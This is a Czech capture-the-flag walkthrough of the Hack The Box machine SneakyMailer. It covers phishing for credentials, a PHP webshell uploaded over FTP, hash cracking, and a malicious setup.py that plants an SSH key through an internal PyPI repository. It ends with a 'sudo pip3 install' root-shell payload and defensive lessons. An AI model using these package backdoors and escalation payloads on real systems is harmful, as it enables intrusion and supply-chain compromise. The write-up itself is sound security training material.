---
layout: post
author: Tomáš Matějíček
title: "SneakyMailer"
date: 2021-01-17
tags: linux ssh sudo php exploit enumeration
---
## Úvod a kontext

SneakyMailer je zajímavý tím, že první přístup nevzniká klasickou technickou zranitelností, ale phishingem. Technická část začíná až ve chvíli, kdy se podaří získat cizí heslo a proměnit ho v přístup k interním službám. Díky tomu je celý stroj spíš o řetězení důvěry mezi poštou, webem, FTP a interním PyPI repozitářem než o jednom konkrétním exploitu.

Foothold vede přes vhost `dev.sneakycorp.htb`, FTP přístup účtu `developer` a jednoduchý webshell. Další pivot na uživatele `low` pak přichází přes interní balíčkovací infrastrukturu. Root část je už čistá konfigurace: `sudo pip3 install` bez omezení je v praxi téměř přímý root shell.

## Počáteční průzkum

### Vyhledání otevřených portů

Nejdřív mapuji, jaké služby jsou na stroji dostupné zvenku a jestli se tu propojují web, pošta a souborové služby.

```bash
ports=$(nmap -p- --min-rate=1000 -T4 -Pn $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v -Pn $IP
```

```text
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.14.2
143/tcp  open  imap     Courier Imapd
8080/tcp open  http     nginx 1.14.2
```

Už samotná kombinace SMTP, IMAP, FTP a více webových portů naznačuje, že půjde o prostředí s více interními workflow a pravděpodobně i více hostname.

### Virtuální hosty

Fuzzing host headeru odhalil subdoménu:

```text
dev.sneakycorp.htb
```

To je důležitý mezikrok, protože veřejný web na `80` nepůsobil jako přímý vstup, zatímco vývojový vhost často bývá napojený na interní uživatele nebo deploy proces.

## Analýza zjištění

### Phishing jako zdroj prvních přihlašovacích údajů

První skutečně použitelný posun přišel přes rozeslání phishingového e-mailu zaměstnancům a zachycení přihlašovacího POSTu. Tato část je důležitá hlavně rozhodovacím způsobem: když má cíl veřejný SMTP a zároveň firemní login formulář, je legitimní zkusit, jestli uživatelé zadávají hesla mimo důvěryhodný web.

Zachycená data patřila účtu:

```text
paulbyrd@sneakymailer.htb
```

Heslo po URL dekódování vyšlo na:

```text
^(#J@SkFv2[%KhIxKk(Ju`hqcHl<:Ht
```

To ještě nebyl finální foothold, ale otevřelo to cestu k dalším interním informacím. Následná práce s poštovním klientem ukázala i další uložené pověření:

```text
Username: developer
Original-Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
```

Právě účet `developer` měl pro další postup praktickou hodnotu.

### Proč zkusit FTP a vývojový vhost

Jakmile se objeví účet s názvem `developer` a současně existuje vhost `dev.sneakycorp.htb`, je rozumné zkusit, jestli stejné přihlašovací údaje neplatí i do FTP nebo deploy procesu. Tady to skutečně vyšlo: účet `developer` umožnil upload souboru na FTP.

Po nahrání jednoduchého `cmd.php` bylo možné získat webshell na vývojové subdoméně:

```text
http://dev.sneakycorp.htb/cmd.php?c=...
```

## Získání přístupu

### Webshell a interní PyPI repozitář

Webshell neposkytl jen příkazy, ale hlavně pohled do lokálního prostředí. Z něj vyplynulo, že v síti existuje i interní PyPI repozitář:

```text
pypi.sneakycorp.htb
```

Současně se podařilo získat `htpasswd` záznam pro účet `pypi`:

```text
pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/
```

Ten šel prolomit:

```bash
/usr/sbin/john SneakyMailer-htpasswd.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
soufianeelhaoui
```

Další rozhodující soubor byl `.pypirc`, který ukazoval, kam se balíčky nahrávají a jaké heslo použít:

```ini
[local]
repository: http://pypi.sneakycorp.htb:8080
username: pypi
password: soufianeelhaoui
```

To je zásadní moment celého stroje: nejde o „jen další heslo“, ale o možnost provést supply-chain pivot přes interní repozitář, kterému důvěřuje jiný lokální uživatel.

### Pivot na `low` přes škodlivý balíček

Stačilo připravit balíček, jehož `setup.py` při instalaci přidá vlastní SSH klíč do `authorized_keys` uživatele `low`:

```python
import setuptools

try:
    with open("/home/low/.ssh/authorized_keys", "a") as f:
        f.write("ssh-rsa __CENSORED__== hack@t")
except Exception:
    pass

setuptools.setup(
    name="test",
    version="0.0.1",
)
```

Nahrání proběhlo přes lokální repozitář:

```bash
HOME=$(pwd)
python3 setup.py sdist register -r local upload -r local
```

Jakmile cílový workflow balíček zpracoval, bylo možné se přihlásit jako `low`:

```bash
ssh low@10.10.10.197
```

Pak už šlo potvrdit běžný uživatelský přístup:

```bash
cat user.txt
```

```text
__CENSORED__
```

## Eskalace oprávnění

### `sudo pip3 install`

První kontrola po přihlášení jako `low` vedla na `sudo -l`:

```bash
sudo -l
```

```text
(root) NOPASSWD: /usr/bin/pip3
```

To je velmi silné oprávnění, protože `pip` při instalaci balíčku provádí kód ze `setup.py`. V praxi tedy nejde jen o správu Python balíčků, ale o možnost spustit libovolný kód jako root.

Stačilo vytvořit dočasný adresář s vlastním `setup.py`:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/pip3 install $TF
```

Tím vznikl root shell a následně i přístup k `root.txt`:

```bash
cat root.txt
```

```text
__CENSORED__
```

## Shrnutí klíčových poznatků

- První použitelná pověření zde nevznikla z exploitu služby, ale z phishingu a následného reuse mezi interními systémy.
- Účet `developer` měl hodnotu hlavně proto, že otevřel FTP upload na vývojový vhost a tím i jednoduchý webshell.
- Skutečně zajímavý pivot vedl přes interní PyPI repozitář, kterému jiný lokální účet důvěřoval při instalaci balíčků.
- Root část byla čistá chyba v delegaci: `sudo pip3 install` dovoluje spustit kód ze `setup.py` jako root.

## Co si odnést do praxe

- Poštovní infrastruktura je plnohodnotná součást útočné plochy. I bez technické zranitelnosti může phishing přinést první heslo, které otevře další interní služby.
- Vývojové vhosty a FTP účty by neměly sdílet stejná pověření s běžnými uživatelskými účty. Jinak se z jedné kompromitované identity stává deploy přístup.
- Interní repozitáře balíčků jsou citlivý supply-chain prvek. Pokud útočník získá možnost do nich nahrávat, může kompromitovat všechny systémy nebo účty, které z nich instalují.
- `sudo` oprávnění pro správce balíčků je potřeba posuzovat jako možnost spouštět libovolný kód. `pip`, `npm`, `gem` a podobné nástroje nejsou bezpečné „jen instalační utility“.
